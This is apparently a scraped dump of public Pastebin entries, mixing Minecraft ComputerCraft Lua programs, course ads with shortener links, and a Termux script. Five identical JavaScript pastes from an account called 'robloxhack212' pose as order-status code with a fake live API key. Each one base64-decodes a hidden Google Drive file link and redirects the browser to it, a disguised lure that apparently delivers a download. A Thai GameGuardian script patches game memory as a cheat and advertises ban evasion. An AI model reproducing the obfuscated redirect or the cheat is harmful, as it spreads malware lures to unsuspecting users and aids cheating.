‎g‎e‎n‎e‎r‎a‎l‎i‎z‎e‎d‎ ‎p‎o‎l‎l‎i‎n‎a‎t‎i‎o‎n‎ ‎s‎y‎n‎d‎r‎o‎m‎e‎.‎ ‎T‎h‎i‎s‎ ‎S‎.‎ ‎f‎l‎o‎s‎-‎c‎u‎c‎u‎l‎i‎ ‎f‎l‎o‎w‎e‎r‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎i‎n‎ ‎N‎i‎i‎t‎v‎ä‎l‎j‎a‎,‎ ‎E‎s‎t‎o‎n‎i‎a‎.‎ ‎T‎h‎i‎s‎ ‎p‎i‎c‎t‎u‎r‎e‎ ‎w‎a‎s‎ ‎f‎o‎c‎u‎s‎-‎s‎t‎a‎c‎k‎e‎d‎ ‎f‎r‎o‎m‎ ‎2‎7‎ ‎s‎e‎p‎a‎r‎a‎t‎e‎ ‎i‎m‎a‎g‎e‎s‎.‎
+
+P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎I‎v‎a‎r‎ ‎L‎e‎i‎d‎u‎s‎
+
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
+
+B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎l‎i‎s‎t‎e‎n‎ ‎t‎o‎ ‎s‎o‎m‎e‎ ‎c‎o‎s‎m‎i‎c‎ ‎b‎a‎c‎k‎g‎r‎o‎u‎n‎d‎ ‎r‎a‎d‎i‎a‎t‎i‎o‎n‎.‎"
+bqhPRGW6,Untitled,Muu2736,Lua,Saturday 29th of March 2025 06:19:50 PM CDT,"-- Script generated by GameGuardian 101.1
+-- Lua help: http://gameguardian.net/help/
+
+local scriptName = [=====[👑  PRO ปั้ม BY เซียน    ➡️  30 มีนาคม 2025]=====]
+local scriptVersion = '1.0.0'
+local scriptAuthor = 'User'
+
+-- วันหมดอายุ
+local expirationDate = os.time({year=2025, month=3, day=30}) -- วันที่หมดอายุ: 30 มีนาคม 2025
+local currentDate = os.time()
+
+-- เช็ควันหมดอายุ
+if currentDate > expirationDate then
+    gg.alert(""🙏วันใช้งานหมด🙏 กรุณาติดต่อ🧑‍✈️ FB เซียน ประวีน"")
+    os.exit()
+end
+
+-- init
+gg.require('101.1', 16142)
+gg.toast(scriptName..' v'..scriptVersion..' by '..scriptAuthor)
+
+-- Function to perform the main action
+function mainAction()
+    gg.clearResults()
+    gg.searchNumber(""h0100000012CA9A3BFF"", gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1, 0)
+
+    local results = gg.getResults(100)
+    for i, v in ipairs(results) do
+        if v.flags == gg.TYPE_BYTE then
+            v.value = ""h3300000012CA9A3BFF""
+            v.freeze = true
+        end
+    end
+    gg.addListItems(results)
+    gg.processResume()
+    gg.toast(""👑 RUN ออโต้กันแบน BY เซียน"")
+end
+
+-- Menu function (ไม่ต้องวนลูป)
+local options = {
+    ""💵   เด้งแพค ปั้มยุทธ์ BY เซียน"",
+  ""🚪    Exit""
+}
+
+local choice = gg.choice(options, nil, scriptName)
+if choice == 1 then
+    mainAction()
+elseif choice == 2 then
+    gg.alert(""📣 🙏🙏 ขอบคุณที่ใช้ บริการครับ 🙏🙏 "")
+end"
+3x3hrY2k,Untitled,Epiphemeral,JavaScript,Saturday 29th of March 2025 06:19:09 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/196/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+m2TUDUpd,Installer,AdditionalPylons,Lua,Saturday 29th of March 2025 06:15:51 PM CDT,"print(""Where would you like to install LIMAPI? (relative to current dir)"")
+local dest = shell.resolve(read())
+shell.run(""pastebin get eREGwRGT ""..dest..""/ui_limapi.lua"")
+shell.run(""pastebin get M9uq3brA ""..dest..""/limapi.lua"")"
+xsb55Ehn,Products.js,robloxhack212,JavaScript,Saturday 29th of March 2025 06:03:41 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/550/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+eREGwRGT,limapi_ui,AdditionalPylons,Lua,Saturday 29th of March 2025 05:57:55 PM CDT,"local MAIN_CHEST = ""minecraft:chest_0""
+local CURR_DIR = fs.getDir(shell.getRunningProgram())
+local RECENTS_FILE = CURR_DIR..""/caches/recent_items.lua""
+local AMOUNTS_FILE = CURR_DIR..""/caches/amounts.txt""
+local CACHE_FILE = CURR_DIR..""/caches/cache.lua""
+
+local inv = require(""limapi"")
+local completion = require(""cc.completion"")
+inv.registerChests()
+inv.setMainChest(MAIN_CHEST)
+
+local w,h = term.getSize()
+
+inv.loadCache(CACHE_FILE)
+local recently_pulled = {}
+local amounts_cache = {}
+local function getRecents(file)
+    local recents_file = fs.open(file,""r"")
+	if recents_file == nil then return end
+    recently_pulled = textutils.unserialise(recents_file.readAll())
+    recents_file.close()
+end
+local function saveRecents(file)
+    local recents_file = fs.open(file,""w"")
+    recents_file.write(textutils.serialise(recently_pulled))
+    recents_file.close()
+end
+local function getAmounts(file)
+    amounts_cache = {}
+    local amounts_file = fs.open(file, ""r"")
+    if amounts_file == nil then return end
+    local l = 0
+    while true do
+        local line = amounts_file.readLine()
+        if not line then break end
+        l = l + 1
+        amounts_cache[l] = line
+    end
+    amounts_file.close()
+end
+local function saveAmounts(file)
+    local amounts_file = fs.open(file,""w"")
+    for i=1,#amounts_cache do
+        amounts_file.write(amounts_cache[i]..""\n"")
+    end
+    amounts_file.close()
+end
+local function updateRecents(item)
+    print(textutils.serialise(recently_pulled))
+    local found = false
+    for i=1,#recently_pulled do
+        if item == recently_pulled[i] then
+            found = true
+            for j=i-1,1,-1 do
+                recently_pulled[j+1]=recently_pulled[j]
+            end
+            break
+        end
+    end
+    if not found then
+        for i=#recently_pulled,1,-1 do
+            recently_pulled[i+1]=recently_pulled[i]
+        end
+    end
+    recently_pulled[1] = item
+    recently_pulled[40] = nil
+    saveRecents(RECENTS_FILE)
+end
+getRecents(RECENTS_FILE)
+getAmounts(AMOUNTS_FILE)
+
+local function uiPullItem()
+    print(""Item ID:"")
+    local name = read()
+    write(""Amount: (default: 1) "")
+    local am = tonumber(read()) or 1
+    
+    if not string.find(name, "":"", 1, true) then
+        name = ""minecraft:""..name
+    end
+    inv.pullItem(name,am)
+    updateRecents(name)
+end
+local function uiRecentItem()
+    local scroll=0
+    local name
+    term.setBackgroundColour(colours.black)
+    while true do
+        term.setCursorPos(1,1)
+        term.clear()
+        for i=1+scroll,scroll+h-1 do
+            if recently_pulled[i]==nil then break end
+            print(""\x07 ""..recently_pulled[i])
+        end
+        term.setCursorPos(w,1)
+        write(""x"")
+        local ev = {os.pullEvent()}
+        if ev[1]==""mouse_scroll"" then
+            scroll=scroll+ev[2]
+            if scroll<0 then scroll=0 end
+        elseif ev[1]==""mouse_click"" or ev[1]==""monitor_touch"" then
+            if ev[3]==w and ev[4]==1 then
+                return
+            end
+            if ev[3]==1 then
+                table.remove(recently_pulled,ev[4]+scroll)
+            else
+                name = recently_pulled[ev[4]+scroll]
+                if name~=nil then
+                    term.setBackgroundColour(colours.blue)
+                    paintutils.drawFilledBox(1,1,w,ev[4]-1)
+                    paintutils.drawFilledBox(1,ev[4]+1,w,h)
+                    term.setCursorPos(1,ev[4]+1)
+                    break
+                end
+            end
+        end
+    end
+    write(""Amount: (default: 1) "")
+    local am = tonumber(read()) or 1
+    inv.pullItem(name,am)
+    updateRecents(name)
+end
+local function convertAmountsTable()
+    amounts_cache = {""Last updated at ""..os.date('%Y-%m-%d %H:%M:%S')}
+    local n = 1
+    for item,count in pairs(inv.listItemsWithCount()) do
+        n = n+1
+        amounts_cache[n] = count.."" x ""..item
+    end
+end
+local function uiListAll()
+    local scroll=0
+    local name
+    term.setBackgroundColour(colours.black)
+    while true do
+        term.setCursorPos(1,1)
+        term.clear()
+        for i=1+scroll,scroll+h-1 do
+            if amounts_cache[i]==nil then break end
+            print(amounts_cache[i])
+        end
+        term.setCursorPos(w-2,1)
+        write(""@ x"")
+        local ev = {os.pullEvent()}
+        if ev[1]==""mouse_scroll"" then
+            scroll=scroll+ev[2]
+            if scroll<0 then scroll=0 end
+        elseif ev[1]==""mouse_click"" or ev[1]==""monitor_touch"" then
+            if ev[3]==w and ev[4]==1 then
+                return
+            end
+            if ev[3]==w-2 and ev[4]==1 then
+                term.setCursorPos(1,h)
+                print(""Recaching all stored values, this may take a while..."")
+                convertAmountsTable()
+                saveAmounts(AMOUNTS_FILE)
+            elseif ev[4]+scroll~=1 and ev[4]~=h then
+                name = amounts_cache[ev[4]+scroll]
+                if name~=nil then
+                    name = name:match(""%d+ x (.+)"")
+                    term.setBackgroundColour(colours.blue)
+                    paintutils.drawFilledBox(1,1,w,ev[4]-1)
+                    paintutils.drawFilledBox(1,ev[4]+1,w,h)
+                    term.setCursorPos(1,ev[4]+1)
+                    break
+                end
+            end
+        end
+    end
+    write(""Amount: (default: 1) "")
+    local am = tonumber(read()) or 1
+    inv.pullItem(name,am)
+    updateRecents(name)
+end
+local function uiSearch()
+    local items = inv.listItems()
+    print(""Search an item"")
+    local name = read(nil,nil,function(p) return completion.choice(p,items) end, ""minecraft:"")
+    write(""\nAmount: (default: 1) "")
+    local am = tonumber(read()) or 1
+    inv.pullItem(name,am)
+    updateRecents(name)
+end
+local function uiHelp()
+    term.setBackgroundColour(colours.black)
+    term.clear()
+    term.setCursorPos(1,1)
+   	print(""Register new chests - add new chests to the system."")
+    print(""Pull an item - pull item by id. \""minecraft:\"" is automatically added."")
+    print(""Pull a recent item - show a list of your recent lookups. Tip: press the \x07 to remove entry."")
+    print(""See the full list - see all the items in the system with their amounts. Since it's a costly operation, you must refresh it manually by pressing @."")
+    print(""Search - same as \""pull an item\"", except with autocompletion."")
+    print(""Return all items - all the items in the main chest are pushed into the system."")
+    print(""Restock - all the items in the main chest are filled to the full stack."")
+    print(""Refresh cache - debug action, use when manually tampering with the system."")
+	write(""To select the main chest, edit the first line of this file. DO NOT PLACE IT ADJACENTLY TO THE COMPUTER."")
+    sleep(1)
+    os.pullEvent()    
+end
+local shutdown = false
+local buttons = {
+    {""Register new chests"", inv.registerChests},
+    {""Pull an item"", uiPullItem},
+    {""Pull a recent item"", uiRecentItem},
+    {""See the full list"", uiListAll},
+    {""Search"",uiSearch},
+    {""Return all items"", inv.returnItems},
+    {""Restock"",inv.restockMainChest},
+    {""Refresh cache (debug)"", inv.createCache},
+    {""Help"",uiHelp},
+    {""Exit"", function() shutdown = true end}
+}
+while true do
+    if shutdown then break end
+    term.setBackgroundColour(colours.grey)
+    term.clear()
+    term.setBackgroundColour(colours.blue)
+    term.setCursorPos(1,1)
+    for i=1,#buttons do
+        print(""\x07 ""..buttons[i][1])
+    end
+    local ev = {os.pullEvent()}
+    if ev[1]==""monitor_touch"" or ev[1]==""mouse_click"" then
+        local c = buttons[ev[4]]
+        if c~=nil then
+            c[2]()
+            term.setCursorPos(w,h)
+        end
+    end
+end
+term.setBackgroundColour(colours.black)
+term.clear()
+term.setCursorPos(1,1)
+inv.saveCache(CACHE_FILE)"
+Rm4QDjVS,Java/Eclipse & Object-Oriented Programming,f0f077,Java,Saturday 29th of March 2025 05:41:32 PM CDT,"Java/Eclipse & Object-Oriented Programming
+Java Essentials for those who want to learn the essentials of Java in a short time
+What you will learn
+Object-Oriented Programming (OOP)
+The classes
+The objects
+The methods
+The attributes
+The legacy (extends)
+for more:https://cuty.io/yLYndQUW28"
+2PB6khpj,Become a Java developer,f0f077,Java,Saturday 29th of March 2025 05:39:08 PM CDT,"Become a Java developer
+Learn the Java language easily, 45 corrected exercises included
+What you will learn
+Create a Java application step by step throughout the course!
+Master the fundamentals of object-oriented programming from Java 8
+Install and use the Java Virtual Machine
+Use language fundamentals such as operators, variables or control structures
+Implement object-specific concepts such as inheritance, interfacing, or polymorphism
+Use concepts from the latest versions such as iterative foreach structures, ellipses, auto-boxing/unboxing or enumerated types
+for more:https://cuty.io/jZhlrJGBf"
+PwwFdBEZ,Market.js,robloxhack212,JavaScript,Saturday 29th of March 2025 05:32:57 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/691/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+pPHTsuG3,Products.js,robloxhack212,JavaScript,Saturday 29th of March 2025 05:02:11 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/625/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+wsZ2Srwv,PYTHON 2025 Certification | 8 PRACTICAL WORKSHOPS + 20 Hours,f0f077,Python,Saturday 29th of March 2025 04:50:31 PM CDT,"PYTHON 2025 Certification | 8 PRACTICAL WORKSHOPS + 20 Hours
+Learn to Program in Python: Developing in Python Has Never Been Easier! 2025 Edition
+What you will learn
+Learn the basics of language as well as advanced concepts
+Saving information in databases
+Automates repetitive tasks
+Create functions to automate tasks
+Creates desktop programs with graphical interfaces
+Create your own modules
+for more:https://cuty.io/DGZT"
+yj0aNZ31,flux-compressor.lua,ccraftersanonmoose,Lua,Saturday 29th of March 2025 04:47:36 PM CDT,"-- Script to stop the flux compressor from exploading
+-- planning to control this behavior via redstone integrator
+-- should turn off compressor when it reaches critical
+-- should also turn the compressor back on when pressure reaches 11 bar
+-- compressor is being used in this case to power a spawner
+
+
+----------
+
+local flux = peripheral.wrap(""pneumaticcraft:flux_compressor_0"")
+local relay = peripheral.wrap(""redstoneIntegrator_0"")
+
+-- monitor pressure & shut off when critical
+local function fluxcontrol()
+    if flux.getPressure() >= 20 then
+        relay.setOutput(""right"", false)
+    elseif flux.getPressure() <= 11 then
+        relay.setOutput(""right"", true)
+
+    end
+end
+
+
+while true do
+    fluxcontrol()
+end"
+pmjt3gPu,NewTimer,doodleloos,Lua,Saturday 29th of March 2025 04:46:12 PM CDT,"--clear screen and display info
+
+local monitor = peripheral.find(""monitor"")
+monitor.setTextScale(.5)
+
+term.clear()
+monitor.clear()
+
+term.setCursorPos(1,1)
+monitor.setCursorPos(1,1)
+
+term.write(""-Timer Program-"")
+monitor.write(""-Timer Program-"")
+
+term.setCursorPos(1,3)
+monitor.setCursorPos(1,3)
+
+term.write (""Cycles: "")
+monitor.write (""Cycles: "")
+
+ITR = io.read()
+
+term.setCursorPos(1,3)
+monitor.setCursorPos(1,3)
+
+term.write (""Cycles: ""..ITR)
+monitor.write (""Cycles: ""..ITR)
+
+term.setCursorPos(1,4)
+monitor.setCursorPos(1,4)
+
+term.write (""Delay: "")
+monitor.write (""Delay: "")
+
+SEC = io.read()
+
+term.setCursorPos(1,4)
+monitor.setCursorPos(1,4)
+
+term.write (""Delay: ""..SEC)
+monitor.write (""Delay: ""..SEC)
+
+term.setCursorPos(1,6)
+monitor.setCursorPos(1,6)
+
+term.write (""-Running"")
+monitor.write (""-Running"")
+
+if ITR ~= 0 then 
+    for i = 1,ITR do 
+        function MAIN()
+    end
+end
+if ITR == 0 then
+    while true do
+        function MAIN()
+	end
+end
+
+
+
+
+term.setCursorPos(1,10)
+monitor.setCursorPos(1,10)
+term.write (""-Complete-"")
+monitor.write (""-Complete-"")
+
+
+
+function MAIN()
+
+	term.setCursorPos(1,7)
+	monitor.setCursorPos(1,7)	
+	
+	term.write (""               "")
+	monitor.write (""               "")	
+	
+	term.setCursorPos(1,7)
+	monitor.setCursorPos(1,7)	
+	
+	term.write (""Cycle ""..i)
+	monitor.write (""Cycle ""..i)	
+
+	rs.setOutput(""front"", true)
+	sleep(.25)
+	rs.setOutput(""front"", false)
+	rs.setOutput(""left"", true)
+	sleep(.25)
+	rs.setOutput(""left"", false)
+	rs.setOutput(""back"", true)
+	sleep(.25)
+	rs.setOutput(""back"", false)
+	rs.setOutput(""right"", true)
+	sleep(.25)
+	rs.setOutput(""right"", false)
+	
+	for x = SEC,1,-1 do 
+		term.setCursorPos(1,8)
+		monitor.setCursorPos(1,8)
+		
+		term.write (""               "")
+		monitor.write (""               "")
+		
+		term.setCursorPos(1,8)
+		monitor.setCursorPos(1,8)
+		
+		term.write (""Seconds ""..x)
+		monitor.write (""Seconds ""..x)
+		
+		sleep(1)
+	end
+
+end
+
+
+"
+ZnNKC6qY,101 Corrected Python Exercises and Algorithms,f0f077,Python,Saturday 29th of March 2025 04:45:41 PM CDT,"101 Corrected Python Exercises and Algorithms
+Improve your skills on dozens of algorithmic concepts with these 101 practical Python exercises.
+What you will learn
+Develop a problem-solving mindset
+Learn little-known functions and techniques
+Discover ways to optimize your code
+Understanding how an algorithm works
+for more:https://cuty.io/tl4NzXRMt"
+pM8MDr3x,quickedit_termux,orborbson,Bash,Saturday 29th of March 2025 04:42:39 PM CDT,"#!/data/data/com.termux/files/usr/bin/sh
+
+if [ -z ""${1}"" ]; then echo ""[BŁĄD]: podaj nazwę pliku""; exit 1; fi
+FILE=""`realpath -q ${1}`""
+if [ ! -f ""${FILE}"" ]; then touch ""${FILE}""; IS_NEW=""true""; fi
+
+APK=""com.rhmsoft.edit""
+
+STAT_A=`stat -c %Y ""${FILE}""`
+if am start -n ""${APK}/${APK}.activity.MainActivity"" -d ""file://${FILE}"" > /dev/null 2>&1; then 
+	sudo sh -c ""while pidof -s -q ${APK}; do sleep 2; done"" 
+else
+	echo ""[BŁĄD]: nie można uruchomić \""${APK}\""""
+fi
+STAT_B=`stat -c %Y ""${FILE}""`
+
+if [ -n ""${IS_NEW}"" ] && [ ""${STAT_A}"" -eq ""${STAT_B}"" ]; then rm -f ""${FILE}""; fi
+"
+LXmFPJXH,Market.js,robloxhack212,JavaScript,Saturday 29th of March 2025 04:31:03 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/015/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
